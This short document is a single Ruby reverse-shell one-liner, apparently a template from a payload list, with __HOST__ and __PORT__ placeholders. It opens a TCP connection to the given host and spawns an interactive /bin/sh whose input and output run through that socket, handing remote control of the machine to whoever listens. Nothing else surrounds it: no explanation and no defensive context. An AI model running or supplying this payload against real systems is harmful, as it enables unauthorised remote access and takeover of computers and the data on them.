ruby -rsocket -e'f=TCPSocket.open("__HOST__",__PORT__).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'